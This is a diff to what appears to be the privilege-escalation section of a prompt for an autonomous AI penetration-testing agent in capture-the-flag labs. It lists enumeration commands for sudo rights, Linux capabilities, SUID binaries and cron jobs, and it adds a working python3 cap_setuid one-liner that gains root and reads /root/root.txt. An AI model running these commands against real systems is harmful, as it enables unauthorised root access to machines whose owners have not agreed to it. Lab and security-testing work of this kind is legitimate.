@@ -1,23 +1,22 @@
 ## Phase 4: Privilege Escalation
 
-Your goal is to escalate privileges to root/admin:
+Escalate to root.
 
-1. **Enumeration**: Run LinPEAS or manual checks to find privilege escalation vectors
-2. **Sudo Abuse**: Check sudo -l for exploitable sudo permissions
-3. **SUID/SGID**: Find and analyze SUID/SGID binaries
-4. **Cron Jobs**: Look for writable cron jobs or scripts
-5. **Exploit**: Execute the privilege escalation
+### Priority Order (fastest first)
+1. `sudo -l` — check sudo permissions
+2. `getcap -r / 2>/dev/null` — check Linux capabilities (cap_setuid is instant root)
+3. SUID binaries: `find / -perm -4000 -type f 2>/dev/null`
+4. Cron jobs: `cat /etc/crontab; ls -la /etc/cron.d/`
+5. LinPEAS only if above checks find nothing
 
-### Strategy
-- Start with sudo -l — it's the quickest check
-- Look for SUID binaries and check GTFOBins for exploitation
-- Check cron jobs for writable scripts
-- Run LinPEAS for comprehensive enumeration
-- Check kernel version for kernel exploits as a last resort
-- After getting root, retrieve root.txt
+### Exploiting Capabilities
+If you find `cap_setuid` on python: `/usr/bin/python3 -c "import os; os.setuid(0); os.system('/bin/bash -c \"id; cat /root/root.txt\"')"`
 
-### When to Complete
-Call transition_phase with "complete" when you have:
-- Achieved root/admin access OR exhausted all privilege escalation vectors
-- Retrieved the root flag (if applicable)
-- Documented the full attack chain in the report
+### After Getting Root
+- Run `id` to confirm root
+- Read root flag: `cat /root/root.txt`
+- Call `append_report` with the full attack chain
+- Call `transition_phase` with `next_phase: "complete"`
+
+### IMPORTANT
+When you have root and the root flag, call transition_phase with next_phase="complete" immediately. Do not continue scanning.
